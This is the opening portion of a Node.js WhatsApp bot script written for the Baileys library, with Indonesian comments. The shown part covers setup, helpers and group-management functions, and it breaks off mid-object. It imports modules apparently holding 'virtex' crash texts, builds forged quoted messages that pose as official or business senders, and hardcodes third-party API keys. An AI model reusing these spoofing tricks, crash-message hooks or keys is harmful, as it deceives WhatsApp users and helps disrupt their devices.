
const {
    WAConnection,
	MessageType,
	Presence,
	MessageOptions,
	Mimetype,
	WALocationMessage,
	WA_MESSAGE_STUB_TYPES,
	WA_DEFAULT_EPHEMERAL,
	ReconnectMode,
	ProxyAgent,
	ChatModification,
	GroupSettingChange,
	waChatKey,
	mentionedJid,
	processTime,
	Browsers,
} = require("@adiwajshing/baileys")
const { virtex1 } = require('./virtex/virtex1')
const { virtex2 } = require('./virtex/virtex2')
const { virtex3 } = require('./virtex/virtex3')
const { virtex4 } = require('./virtex/virtex4')
const { virtex5 } = require('./virtex/virtex5')
const { virtex6 } = require('./virtex/virtex6')
const { virtex7 } = require('./virtex/virtex7')
const { virtex8 } = require('./virtex/virtex8')
const { virtex9 } = require('./virtex/virtex9')
const { ngazap } = require('./virtex/ngazap')
const { virtag } = require('./virtex/virtag')
const { emoji2 } = require('./virtex/emoji2')
const { addCommands, checkCommands, deleteCommands } = require('./storage/autoresp')
const scrapper = require('./lib/scrapper')
const moment = require("moment-timezone")
const crypto = require("crypto")
const speed = require('performance-now')
const { spawn, exec, execSync } = require("child_process")
const ffmpeg = require('fluent-ffmpeg')
const twitterGetUrl = require("twitter-url-direct")
const googleImage = require('g-i-s')
//const Math_js = require('mathjs')
const brainly = require('brainly-scraper')
const fetch = require('node-fetch');
const request = require('request');
const yts = require( 'yt-search')
const ms = require('parse-ms')
const toMs = require('ms')
const axios = require("axios")
const fs = require("fs-extra")
const util = require('util')
const got = require("got");
const xa = require("xfarr-api")
const hx = require('hxz-api')
const qrcodes = require('qrcode');
const imgbb = require('imgbb-uploader');
const os = require('os');
const nodemailer = require('nodemailer');
const Mfake = fs.readFileSync ('./media/ganteng.jpg')
const Mthumb = fs.readFileSync('./media/ganteng.jpg')
const timeWib = moment.tz('Asia/Jakarta').format('DD/MM')	
// stickwm
const Exif = require('./lib/exif');
const exif = new Exif();

const { downloadMenu, infoMenu, gameMenu, groupMenu, funMenu, wibuMenu, ownerMenu, stickerMenu, otherMenu, rulesBot, islamMenu, sertiMenu, ceritaMenu, makerMenu,dewasaMenu, toolsMenu} = require('./message/help.js')
const { getBuffer, getGroupAdmins, getRandom, runtime, sleep } = require('./lib/myfunc')
const { fetchJson, getBase64, kyun, createExif } = require('./lib/fetch')
const { color, bgcolor } = require('./lib/color')
const { mess } = require('./message/mess')
const { webp2mp4File } = require('./lib/webp2mp4')
const { Toxic } = require('./lib/Toxic.js')
const { cmdadd } = require('./lib/totalcmd.js')
const { uptotele, uploadFile, RESTfulAPI, uploadImages } = require('./lib/uploadimage')
const { isGame, gameAdd, givegame, cekGLimit } = require("./lib/limit");
const { onGoing, dadu, asupan } = require("./lib/otakudesu.js")
const { mediafireDl } = require('./lib/mediafire.js')
const { webp2gifFile, igDownloader, TiktokDownloader } = require("./lib/gif.js")
const { y2mateA, y2mateV } = require('./lib/y2mate')
const { yta, ytv, igdl, upload } = require('./lib/ytdl')
const premium = require("./lib/premium");
const afk = require("./lib/afk");
const _sewa = require("./lib/sewa");
const level = require("./lib/level");
const atm = require("./lib/atm");
const { herolist } = require('./lib/herolist.js')
const { herodetails } = require('./lib/herodetail.js')
const set = JSON.parse(fs.readFileSync('./src/setting2.json'))
const tes = JSON.parse(fs.readFileSync('./src/settingsymbol.json'))
//const setting = JSON.parse(fs.readFileSync('./setting.json'))
const vien = JSON.parse(fs.readFileSync('./storage/vien.json'))
const imagi = JSON.parse(fs.readFileSync('./storage/imagi.json'))
const setik = JSON.parse(fs.readFileSync('./storage/setik.json'))
const commandsDB = JSON.parse(fs.readFileSync('./storage/commands.json'))

//Biarin
var kuis = false
hit_today = []
ky_ttt = []
const setGelud = require('./lib/gameGelud.js')
const game = require("./lib/game");
tttawal= ["0️⃣","1️⃣","2️⃣","3️⃣","4️⃣","5️⃣","6️⃣","7️⃣","8️⃣","9️⃣"]

//Storage
let setiker = JSON.parse(fs.readFileSync('./temp/stik.json'))
let imagenye = JSON.parse(fs.readFileSync('./temp/image.json'))
let videonye = JSON.parse(fs.readFileSync('./temp/video.json'))
let audionye = JSON.parse(fs.readFileSync('./temp/vn.json'))
let fakeimage = fs.readFileSync("./media/ganteng.jpg")
let errorImg = 'https://i.ibb.co/FBm52Pt/1e0fe6a08b67.jpg'
let setting = JSON.parse(fs.readFileSync('./setting.json'))
let config = JSON.parse(fs.readFileSync('./srv/config.js'))
undef2 = fs.readFileSync('./tag1.webp')
owner = setting.owner
gamewaktu = setting.gamewaktu
petik = '```'
autovn = set.autovn
autoketik = set.autoketik
antidel = set.antidel
antical = set.antical
fake = set.FakeText

// Biarin Udh Nyambung Ke setting yg di src

NamaBot = set.NamaBot
NamaOwner = set.NamaOwner
NOwner = set.NomorOwner
NomorOwnz = set.NomorOwnz
NomorOwnc = set.NomorOwnc
GrubBot = set.GrubBot
GrubBot2 = set.GrubBot2
FakePdf = set.FakePdf
FakeYt = set.FakeYt
FakeText = set.FakeText
FakeLoc = set.FakeReply
TextDiButton = set.TextDiButton
HargaPermanen = set.HargaPermanen
HargaPerbulan = set.HargaPerbulan
HargaPerminggu = set.HargaPerminggu
HargaPremium = set.HargaPremium
NomorGopay = set.NomorGopay
NomorDana = set.NomorDana
NomorOvo = set.NomorOvo
NomorPulsa = set.NomorPulsa
fakeimg = fs.readFileSync('./img/zero.jpg')
fakethumb = fs.readFileSync('./img/thumbnail.jpg')
faketeks = '©CREATED BY BAMBANG TRI RAHARJO'
blocked = []
multi =false
autorespon = false
offline = false
nopref = false
allpref = true
readGc = true
readPc = true
antidel = true
autojoin = true
// Symbol
atas = tes.Atas
bawah = tes.Bawah
bates = tes.Bates
buletan = tes.Buletan
garis = tes.Garis
kecil = tes.Kecil
in_fake = tes.Infake
kotak = tes.Kotak
ownerl = tes.Ownerl
adminl = tes.Adminl
freel = tes.freel

//apikey
var apikey1 = config.apikey1
var apikey2 = config.Xteam
var apikey3 = config.Vhtear
var apikey4 = config.Zeks
var apikey5 = config.Zero
var apikey6 = config.Nurutomo
var apikey7 = config.Hunter
var apikey10 = config.LexApi
var xchillds = 'XChillDs'
var hardi = '12345'
var apisenku = 'SenkuApi' //UNLIMITED
var rakukey = 'RakuKeyTod' //KEKNYA UNLIMITED
dapukey = 'wf2tghNhfU' //3000 LIMIT
botxyz = 'Aprii' //GW KASIH UNLIMITED
hardikey = 'hardianto' //UNLIMITED
vinkoapi = 'rxking' //UNLIMITED
ogatakey = 'KFrfhVC4' // 3000 limit
apixteam = 'bb3f4daecfeb0cf0' // APIKEY XTEAM REGIST AJA BIAR GA CEPET HA
TobzKey = 'BotWeA'
TechApi = '5BNIDH-1T0kPj-gWqG6q-sHtuHA-AWBSgZ'
zeksapi = 'ApiBotIndo' //3000 LIMIT

//Vcard

const vcard = 'BEGIN:VCARD\n' 
            + 'VERSION:3.0\n' 
            + `FN: ${NamaOwner}\n` 
            + `ORG: Contact ${NamaOwner};\n`
            + `TEL;type=CELL;type=VOICE;waid=${NomorOwnz}:${NomorOwnc}\n`
            + 'END:VCARD'

// Database
let kickarea = JSON.parse(fs.readFileSync("./storage/antibule.json"));
let _registered = JSON.parse(fs.readFileSync('./database/user/registered.json'))
let welkom = JSON.parse(fs.readFileSync('./database/group/welcome.json'))
let _premium = JSON.parse(fs.readFileSync('./database/user/premium.json'));
let ban = JSON.parse(fs.readFileSync('./database/user/ban.json'));
let _afk = JSON.parse(fs.readFileSync('./database/user/afk.json'));
let _leveling = JSON.parse(fs.readFileSync('./database/group/leveling.json'))
let glimit = JSON.parse(fs.readFileSync('./database/user/glimit.json'));
let antilink = JSON.parse(fs.readFileSync('./database/group/antilink.json'));
const antivirtex = JSON.parse(fs.readFileSync("./database/antivirtex.json"))        
const antihidetg = JSON.parse(fs.readFileSync("./database/antihidetag.json"));    
let mute = JSON.parse(fs.readFileSync('./database/group/mute.json'));
let _update = JSON.parse(fs.readFileSync('./database/bot/update.json'))
let sewa = JSON.parse(fs.readFileSync('./database/group/sewa.json'));
let _scommand = JSON.parse(fs.readFileSync('./database/bot/scommand.json'))
//let inv = JSON.parse(fs.readFileSync('./database/user/inven.json'))

     
     const time2 = moment().tz('Asia/Jakarta').format('HH:mm:ss')
if(time2 < "23:59:00"){
var tampilUcapan = '🌃Malam Kak'
                                        }
if(time2 < "19:00:00"){
var tampilUcapan = '🌇Petang Kak'
                                         }
if(time2 < "18:00:00"){
var tampilUcapan = '🌁️Sore Kak'
                                         }
if(time2 < "15:00:00"){
var tampilUcapan = '🌅Siang Kak'
                                         }
if(time2 < "11:00:00"){
var tampilUcapan = '🌄Pagi Kak'
                                         }
if(time2 < "05:00:00"){
var tampilUcapan = '🌃Malam Kak'
                                         }

// Sticker Cmd
const addCmd = (id, command) => {
    const obj = { id: id, chats: command }
    _scommand.push(obj)
    fs.writeFileSync('./database/bot/scommand.json', JSON.stringify(_scommand))
}

const getCommandPosition = (id) => {
    let position = null
    Object.keys(_scommand).forEach((i) => {
        if (_scommand[i].id === id) {
            position = i
        }
    })
    if (position !== null) {
        return position
    }
}

const getCmd = (id) => {
    let position = null
    Object.keys(_scommand).forEach((i) => {
        if (_scommand[i].id === id) {
            position = i
        }
    })
    if (position !== null) {
        return _scommand[position].chats
    }
}


const checkSCommand = (id) => {
    let status = false
    Object.keys(_scommand).forEach((i) => {
        if (_scommand[i].id === id) {
            status = true
        }
    })
    return status
}
		//>>>>>>>>STICKER<<<<<<<\\
		const sticOwner = (hehe) => {
			ano = fs.readFileSync('./sticker/anime/owner.webp')
			Bambang.sendMessage(hehe, ano, sticker, { quoted: mek})
		}
		const sticNotAdmin = (hehe) => {
			ano = fs.readFileSync('./sticker/anime/notadmin.webp')
			Bambang.sendMessage(hehe, ano, sticker, { quoted: mek})
		}
		const sticAdmin = (hehe) => {
			ano = fs.readFileSync('./sticker/anime/admin.webp')
			Bambang.sendMessage(hehe, ano, sticker, { quoted: mek})
		}
		const sticWait = (hehe) => {
			ano = fs.readFileSync('./sticker/anime/wait.webp')
			Bambang.sendMessage(hehe, ano, sticker, { quoted: mek})
		}
		const sticKick = (hehe) => {
			ano = fs.readFileSync('./sticker/anime/kick.webp')
			Bambang.sendMessage(hehe, ano, sticker, { quoted: mek})
		}
		const sticOk = (hehe) => {
			ano = fs.readFileSync('./sticker/anime/ok.webp')
			Bambang.sendMessage(hehe, ano, sticker, { quoted: mek})
		}


// Daftar
const addRegisteredUser = (userid, sender, age, time, serials) => {
const obj = { id: userid, name: sender, time: time, serial: serials }
_registered.push(obj)
fs.writeFileSync('./database/user/registered.json', JSON.stringify(_registered))
}
const checkRegisteredUser = (sender) => {
let status = false
Object.keys(_registered).forEach((i) => {
if (_registered[i].id === sender) {
status = true
}
})
return status
}
const daftar1 = `Hai kak Sebelum Mengakses Bot Verify Terlebih Dahulu Ya `
const daftar2 = '```Ketik Tombol Di Bawah Untuk Verify Kak```'
const daftar3 = [{buttonId: `#verify`,buttonText: {displayText: `🗿DAFTAR🗿 `,},type: 1,},]

const createSerial = (size) => {
return crypto.randomBytes(size).toString('hex').slice(0, size)
}

//end
module.exports = Bambang = async (Bambang, mek) => {
	try {
        if (!mek.hasNewMessage) return
        mek = mek.messages.all()[0]
		if (!mek.message) return
		if (mek.key && mek.key.remoteJid == 'status@broadcast') return
		if (mek.key.id.startsWith('3EB0') && mek.key.id.length === 12) return
		global.ky_ttt
		global.blocked
		mek.message = (Object.keys(mek.message)[0] === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message
		const { text, extendedText, contact, location, liveLocation, image, video, sticker, document, audio, product } = MessageType
		const time = moment.tz('Asia/Jakarta').format('DD/MM HH:mm:ss')
	    const wib = moment.tz('Asia/Jakarta').format('HH:mm:ss')
		const wita = moment.tz('Asia/Makassar').format("HH:mm:ss")
        const wit = moment.tz('Asia/Jayapura').format("HH:mm:ss")
		const timi = moment.tz('Asia/Jakarta').add(30, 'days').calendar()
		const timu = moment.tz('Asia/Jakarta').add(20, 'days').calendar()
		const content = JSON.stringify(mek.message)
		const from = mek.key.remoteJid
		const type = Object.keys(mek.message)[0]        
        const cmd = (type === 'conversation' && mek.message.conversation) ? mek.message.conversation : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') && mek.message.extendedTextMessage.text ? mek.message.extendedTextMessage.text : ''.slice(1).trim().split(/ +/).shift().toLowerCase()
        const prefix = /^[°•π÷×¶∆£¢€¥®™=|~#%^&.?/\\©^z+*,;]/.test(cmd) ? cmd.match(/^[°•π÷×¶∆£¢€¥®™=|~#%^&.?/\\©^z+*,;]/gi) : '!'
        body = (type === 'conversation' && mek.message.conversation.startsWith(prefix)) ? mek.message.conversation : (type == 'imageMessage') && mek.message[type].caption.startsWith(prefix) ? mek.message[type].caption : (type == 'videoMessage') && mek.message[type].caption.startsWith(prefix) ? mek.message[type].caption : (type == 'extendedTextMessage') && mek.message[type].text.startsWith(prefix) ? mek.message[type].text : (type == 'listResponseMessage') && mek.message[type].singleSelectReply.selectedRowId ? mek.message[type].singleSelectReply.selectedRowId : (type == 'buttonsResponseMessage') && mek.message[type].selectedButtonId ? mek.message[type].selectedButtonId : (type == 'stickerMessage') && (getCmd(mek.message[type].fileSha256.toString('base64')) !== null && getCmd(mek.message[type].fileSha256.toString('base64')) !== undefined) ? getCmd(mek.message[type].fileSha256.toString('base64')) : ""
		budy = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : ''
		const command = body.slice(1).trim().split(/ +/).shift().toLowerCase()	
		const command1 = body.slice(2).trim().split(/ +/).shift().toLowerCase()	
		const args = body.trim().split(/ +/).slice(1)
		hit_today.push(command)
		const arg = body.substring(body.indexOf(' ') + 1)
		const ar = args.map((v) => v.toLowerCase())
		const argz = body.trim().split(/ +/).slice(1)
		const isCmd = body.startsWith(prefix) 
		if (isCmd) cmdadd()
		const totalhit = JSON.parse(fs.readFileSync('./database/totalcmd.json'))[0].totalcmd
        const q = args.join(' ')
        //const m = simple.smsg(Bambang, mek);
	    const query = (teks) => {Bambang.sendMessage(from, `Kasih Query Woy`, text, {quoted:mek,contextInfo: {forwardingScore: 508, isForwarded: true}})}				
        const botNumber = Bambang.user.jid
        const ownerNumber = [`${NOwner}`,`6282313021398@s.whatsapp.net`,`6282313021398@s.whatsapp.net`]
		//const ownerName = setting.ownerName
	//	const botName = setting.botName
		const isGroup = from.endsWith('@g.us')
		let sender = isGroup ? mek.participant : mek.key.remoteJid
		let senderr = mek.key.fromMe ? Bambang.user.jid : mek.key.remoteJid.endsWith('@g.us') ? mek.participant : mek.key.remoteJid
		const totalchat = await Bambang.chats.all()
		const groupMetadata = isGroup ? await Bambang.groupMetadata(from) : ''
		const groupName = isGroup ? groupMetadata.subject : ''
		const groupId = isGroup ? groupMetadata.jid : ''
		const groupMembers = isGroup ? groupMetadata.participants : ''
		const groupDesc = isGroup ? groupMetadata.desc : ''
		const groupOwner = isGroup ? groupMetadata.owner : ''
		const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : ''
		const isBotGroupAdmins = groupAdmins.includes(botNumber) || false
		const isGroupAdmins = groupAdmins.includes(sender) || false
	    const more = String.fromCharCode(8206)
	    const readd = more.repeat(4001)
        const conts = mek.key.fromMe ? Bambang.user.jid : Bambang.contacts[sender] || { notify: jid.replace(/@.+/, '') }
        const pushname = mek.key.fromMe ? Bambang.user.name : conts.notify || conts.vname || conts.name || '-'
        const mentionByTag = type == "extendedTextMessage" && mek.message.extendedTextMessage.contextInfo != null ? mek.message.extendedTextMessage.contextInfo.mentionedJid : []
        const mentionByreply = type == "extendedTextMessage" && mek.message.extendedTextMessage.contextInfo != null ? mek.message.extendedTextMessage.contextInfo.participant || "" : ""
        const mention = typeof(mentionByTag) == 'string' ? [mentionByTag] : mentionByTag
        mention != undefined ? mention.push(mentionByreply) : []
        const mentionUser = mention != undefined ? mention.filter(n => n) : []
		idttt = []
	    players1 = []
	    players2 = []
	    gilir = []
	    for (let t of ky_ttt){
	    idttt.push(t.id)
	    players1.push(t.player1)
	    players2.push(t.player2)
	    gilir.push(t.gilir)
}
	    const isTTT = isGroup ? idttt.includes(from) : false
	    isPlayer1 = isGroup ? players1.includes(sender) : false
        isPlayer2 = isGroup ? players2.includes(sender) : false
        const isOwner = ownerNumber.includes(senderr)
        const isPremium = premium.checkPremiumUser(sender, _premium)    
       const isRegistered = checkRegisteredUser(sender)    
      //  const isBlockir = banned.checkBan(sender, ban)
        const isSewa = _sewa.checkSewaGroup(from, sewa)
        const isAfkOn = afk.checkAfkUser(sender, _afk)
        const isLevelingOn = isGroup ? _leveling.includes(from) : false
        const isMuted = isGroup ? mute.includes(from) : false
        //const isKickarea = isGroup ? kickarea.includes(from) : false;
        const isAntiLink = isGroup ? antilink.includes(from) : false
        const isAntihidetag = isGroup ? antihidetg.includes(from) : false
        const isAntiVirtex = isGroup ? antivirtex.includes(from) : false
//const isMuted = isGroup ? mute.includes(from) : false
        const isWelkom = isGroup ? welkom.includes(from) : false
        const isKickarea = isGroup ? kickarea.includes(from) : false
		const dfrply = fs.readFileSync(`./media/canss.jpg`)
		const fake = fs.readFileSync(`./media/canss.jpg`)
		const floc3 = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "liveLocationMessage": { "caption": `Runtime : ${runtime(process.uptime())}\n${FakeLoc}`} } }
		
// 𝘼𝙪𝙩𝙤 𝙍𝙚𝙖𝙙 𝙂𝙘
var ampun = await Bambang.chats.array.filter(v => v.jid.endsWith('g.us'))
ampun.map( async ({ jid }) => {
if (readGc === false) return
await Bambang.chatRead(jid)
})
// 𝘼𝙪𝙩𝙤 𝙍𝙚𝙖𝙙 𝙋𝙘
var chatss = await Bambang.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
chatss.map( async ({ jid }) => {
if (readPc === false) return
await Bambang.chatRead(jid)
})

// 𝘼𝙪𝙩𝙤 𝙑𝙣:𝙫
if (autovn) {
	if (autovn === false) return
await Bambang.updatePresence(from, Presence.recording)
} else if (autoketik) {
	if (autoketik === false) return
await Bambang.updatePresence(from, Presence.composing)
}
////////////CONST GAME/RANDOM MATH
            const mekla1 = ['1','2','3','4','5','6','7','8','9']
            const mekla2 = ['1','2','3','4','5','6','7','8','9'] 
            const random1 = ['1','2','3','4','5','6','7','8','9'] 
            const random2 = ['1','2','3','4','5','6','7','8','9'] 
            const random3 = ['1','2','3','4','5','6','7','8','9'] 
            const random4 = ['1','2','3','4','5','6','7','8','9'] 
            const random5 = ['1','2','3','4','5','6','7','8','9'] 
            const mekla3 = mekla1[Math.floor(Math.random() * (mekla1.length))]
            const mekla4 = mekla2[Math.floor(Math.random() * (mekla2.length))]   
            const random6 = random1[Math.floor(Math.random() * (random1.length))]      
             const random7 = random2[Math.floor(Math.random() * (random5.length))]      
 const random8 = random3[Math.floor(Math.random() * (random5.length))]      
 const random9 = random4[Math.floor(Math.random() * (random5.length))]      
  const random10 = random5[Math.floor(Math.random() * (random5.length))]      
        // here button function
        selectedButton = (type == 'buttonsResponseMessage') ? mek.message.buttonsResponseMessage.selectedButtonId : ''

        responseButton = (type == 'listResponseMessage') ? mek.message.listResponseMessage.title : ''

        const gcount = setting.gcount
        
        const listmsg = (from, title, desc, list) => { // ngeread nya pake rowsId, jadi command nya ga keliatan
            let po = Bambang.prepareMessageFromContent(from, {"listMessage": {"title": title,"description": desc,"buttonText": "Pilih Disini","footerText": "SEMOGA DAPAT MEMBANTU","listType": "SINGLE_SELECT","sections": list}}, {})
            return Bambang.relayWAMessage(po, {waitForAck: true})
        }
        
        const isUrl = (url) => {
            return url.match(new RegExp(/https?:\/\/(www\.)?[-a-zA-Z0-9@:%._+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%_+.~#?&/=]*)/, 'gi'))
        }
        function monospace(string) {
            return '```' + string + '```'
        }   
        function jsonformat(string) {
            return JSON.stringify(string, null, 2)
        }
        function randomNomor(angka){
            return Math.floor(Math.random() * angka) + 1
        }
        const sendMess = (hehe, teks) => {
           Bambang.sendMessage(hehe, teks, text)
        }
        const mentions = (teks, memberr, id) => {
	    (id == null || id == undefined || id == false) ? Bambang.sendMessage(from, teks.trim(), extendedText, { contextInfo: { "mentionedJid": memberr } }) : Bambang.sendMessage(from, teks.trim(), extendedText, { quoted: mek, contextInfo: { "mentionedJid": memberr } })
 		}
        const sendText = (from, text) => {
           Bambang.sendMessage(from, text, MessageType.text)
        }
        const textImg = (teks) => {
           return Bambang.sendMessage(from, teks, text, {quoted: mek})
        }
        const freply = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: '16504228206@s.whatsapp.net' } : {}) }, message: { "contactMessage": { "displayName": `${pushname}`, "vcard": `BEGIN:VCARD\nVERSION:3.0\nN:XL;${pushname},;;;\nFN:${pushname},\nitem1.TEL;waid=${senderr.split('@')[0]}:${senderr.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, "jpegThumbnail":fs.readFileSync('./media/sherlynn.jpg')
        }}}
       const math = (teks) => {
           return Math.floor(teks)
       }
       const kick = function(from, orangnya){
	       for (let i of orangnya){
	       Bambang.groupRemove(from, [i])
        }
        }
//var hayuk0 = '[NOT VERIFIED]'
		///	if (isRegistered) {
	//		hayuk0 = '[√ VERIFIED]'
		//	}
       const kickMember = async(id, target = []) => {
           let group = await Bambang.groupMetadata(id)
           let owner = group.owner.replace("c.us", "s.whatsapp.net")
           let me = Bambang.user.jid
           for (i of target) {
           if (!i.includes(me) && !i.includes(owner)) {
           await Bambang.groupRemove(to, [i])
        } else {
           await Bambang.sendMessage(id, "Not Premited!", "conversation")
           break
        }
    }
}
       const add = function(from, orangnya){
	       Bambang.groupAdd(from, orangnya)
}
       const sendKontak = (from, nomor, nama, org = "") => {
	       const vcard = 'BEGIN:VCARD\n' + 'VERSION:3.0\n' + 'FN:' + nama + '\n' + 'ORG:' + org + '\n' + 'TEL;type=CELL;type=VOICE;waid=' + nomor + ':+' + nomor + '\n' + 'END:VCARD'
	       Bambang.sendMessage(from, {displayname: nama, vcard: vcard}, MessageType.contact, {quoted: mek})
}
      const hideTag = async function(from, text){
	       let anu = await Bambang.groupMetadata(from)
	       let members = anu.participants
	       let ane = []
	       for (let i of members){
	       ane.push(i.jid)
}
	       Bambang.sendMessage(from, {text:text, jpegThumbnail:fs.readFileSync('media/sherlynn.jpg')}, 'extendedTextMessage', {contextInfo: {"mentionedJid": ane}})
}  
      		    const katalog = (teks) => {
             res = Bambang.prepareMessageFromContent(from, { "orderMessage": { "itemCount": 2021, "message": teks, "footerText": "*By Bambang*", "thumbnail":fs.readFileSync(`./media/canss.jpg`), "surface": 'CATALOG' }}, {quoted:mek})
             Bambang.relayWAMessage(res)
             }
             const sendWebp = async(from, url) => {
                var names = Date.now() / 10000;
                var download = function (uri, filename, callback) {
                    request.head(uri, function (err, res, body) {
                        request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
                    });
                };
                download(url, './temp' + names + '.png', async function () {
                    console.log('selesai');
                    let ajg = './temp' + names + '.png'
                    let palak = './temp' + names + '.webp'
                    exec(`ffmpeg -i ${ajg} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${palak}`, (err) => {
                        let media = fs.readFileSync(palak)
                        Bambang.sendMessage(from, media, MessageType.sticker,{quoted:mek})
                        fs.unlinkSync(ajg)
                        fs.unlinkSync(palak)
                    });
                });
            }
       const sendMediaURL = async(to, url, text="", mids=[]) =>{
           if(mids.length > 0){
           text = normalizeMention(to, text, mids)
}
           const fn = Date.now() / 10000;
           const filename = fn.toString()
           let mime = ""
           var download = function (uri, filename, callback) {
           request.head(uri, function (err, res, body) {
           mime = res.headers['content-type']
           request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
});
};
           download(url, filename, async function () {
           console.log('SUCCES');
           let media = fs.readFileSync(filename)
           let type = mime.split("/")[0]+"Message"
           if(mime === "image/gif"){
           type = MessageType.video
           mime = Mimetype.gif
}
           if(mime.split("/")[0] === "audio"){
           mime = Mimetype.mp4Audio
}
           Bambang.sendMessage(to, media, type, {quoted: mek, mimetype: mime, caption: text, thumbnail: Buffer.alloc(0), contextInfo: {"mentionedJid": mids}})
                     
           fs.unlinkSync(filename)
});
}
      const sendFileFromUrl = async(link, type, options) => {
           hasil = await getBuffer(link)
	       Bambang.sendMessage(from, hasil, type, options).catch(e => {
	       fetch(link).then((hasil) => {
	       Bambang.sendMessage(from, hasil, type, options).catch(e => {
	       Bambang.sendMessage(from, { url : link }, type, options).catch(e => {
	       reply('_[ ! ] Error Gagal Dalam Mendownload Dan Mengirim Media_')
	       console.log(e)
})
})
})
})
}
      const promoteAdmin = async function(to, target=[]){
           if(!target.length > 0) { return  reply("No target..") }
           let g = await Bambang.groupMetadata(to)
           let owner = g.owner.replace("c.us","s.whatsapp.net")
           let me = Bambang.user.jid
           for (i of target){
           if (!i.includes(me) && !i.includes(owner)){
           const res = await Bambang.groupMakeAdmin(to, [i])
           reply(`Hm..... @${mentioned[0].split('@')[0]} JABATANMU DINAIKAN AKU BANGGA PADAMU`)
}
}
}
      const demoteAdmin = async function(to, target=[]){
           if(!target.length > 0) { return  reply("No target..") }
           let g = await Bambang.groupMetadata(to)
           let owner = g.owner.replace("c.us","s.whatsapp.net")
           let me = Bambang.user.jid
           for (i of target){
           if (!i.includes(me) && !i.includes(owner)){
           const res = await Bambang.groupDemoteAdmin(to, [i])
           reply(`Hm..... @${mentioned[0].split('@')[0]} JABATANMU TURUNKAN SAYA IKUT SEDIH`)
				
}
}
}
          let authorname = Bambang.contacts[from] != undefined ? Bambang.contacts[from].vname || Bambang.contacts[from].notify : undefined	
          if (authorname != undefined) { } else { authorname = groupName }	
          function addMetadata(packname, author) {	
          if (!packname) packname = 'WABot'; if (!author) author = 'Bot';author = author.replace(/[^a-zA-Z0-9]/g, '');	
          let name = `${author}_${packname}`
          if (fs.existsSync(`./sticker/${name}.exif`)) return `./sticker/${name}.exif`
          const json = {	
         "sticker-pack-name": packname,
         "sticker-pack-publisher": author,
}
         const littleEndian = Buffer.from([0x49, 0x49, 0x2A, 0x00, 0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0x41, 0x57, 0x07, 0x00])	
         const bytes = [0x00, 0x00, 0x16, 0x00, 0x00, 0x00]	
         let len = JSON.stringify(json).length	
         let last	
         if (len > 256) {	
         len = len - 256	
         bytes.unshift(0x01)	
         } else {	
         bytes.unshift(0x00)	
}	
         if (len < 16) {	
         last = len.toString(16)	
         last = "0" + len	
         } else {	
         last = len.toString(16)	
}	
       const buf2 = Buffer.from(last, "hex")	
	   const buf3 = Buffer.from(bytes)	
	   const buf4 = Buffer.from(JSON.stringify(json))	
	   const buffer = Buffer.concat([littleEndian, buf2, buf3, buf4])	
	   fs.writeFile(`./sticker/${name}.exif`, buffer, (err) => {	
	   return `./sticker/${name}.exif`	
})	
}
 // FAKE REPLY BY YOGI PEWE
// PRODUCT
const ftok = {
key: {
			fromMe: false,
			participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})
		},
		message: {
			"productMessage": {
				"product": {
					"productImage":{
						"mimetype": "image/jpeg",
						"jpegThumbnail": dfrply //Gambarnye
					},
					"title": `${tampilUcapan} ${pushname}`, //Kasih namalu 
					"description": `Im BambangGans`, 
					"currencyCode": "USD",
					"priceAmount1000": "2000",
					"retailerId": `© Bambang Ganteng`,
					"productImageCount": 1
				},
				    "businessOwnerJid": `0@s.whatsapp.net`
		}
	}
}
// TROLI
const ftrol = {
	key : {
                          participant : '0@s.whatsapp.net'
                        },
       message: {
                    orderMessage: {
                            itemCount : 123,
                            status: 1,
                            surface : 1,
                            message: `Im BambangGans`, //Kasih namalu
                            orderTitle: `Ownered By Bambang`,
                            thumbnail: dfrply, //Gambarnye
                            sellerJid: '0@s.whatsapp.net' 
                          }
                        }
                      }
// LOCATION
const floc = {
	key : {
           participant : '0@s.whatsapp.net'
                        },
       message: {
                    liveLocationMessage: {
                    caption: `${tampilUcapan} ${pushname}`,
                    jpegThumbnail: dfrply
                          }
                        }
                      }
// DOCUMENT
const fdoc = {
	key : {
           participant : '0@s.whatsapp.net'
                        },
       message: {
                    documentMessage: {
                    title: `${tampilUcapan} ${pushname}`, 
                    jpegThumbnail: dfrply
                          }
                        }
                      }
// VIDEO
const fvid = {
	 key: { 
          fromMe: false,
	      participant: `0@s.whatsapp.net`, ...(from ? 
	 { remoteJid: "6289643739077-1613049930@g.us" } : {}) 
                },
	 message: { 
                 "videoMessage": { 
                 "title": `${tampilUcapan} ${pushname}`,
                 "h": `${tampilUcapan} ${pushname}`,
                 'duration': '99999', 
                 'caption': `${tampilUcapan} ${pushname}`,
                 'jpegThumbnail': dfrply
                        }
                       }
	                  }
// GROUPINVITE
const finv = {
	"key": {
		"fromMe": false,
		"participant": "0@s.whatsapp.net",
		"remoteJid": "0@s.whatsapp.net"
	},
	"message": {
		"groupInviteMessage": {
			"groupJid": "6288213840883-1616169743@g.us",
			"inviteCode": `${tampilUcapan} ${pushname}`,
			"groupName": `${tampilUcapan} ${pushname}`, 
            "caption": `${tampilUcapan} ${pushname}`, 
            'jpegThumbnail': dfrply
		}
	}
}
// STICKER
const fstick = {
"key": {
	  "participant": `0@s.whatsapp.net`,
      "remoteJid": "6289643739077-1613049930@g.us",
      "fromMe": false,
      "id": "3B64558B07848BD81108C1D14712018E"
    },
    "message": {
      "stickerMessage": {
        "fileSha256": "uZiOJzqOvrOo2WGjnMKgX2MMQMyasT+ZDgqUczpIBmY=",
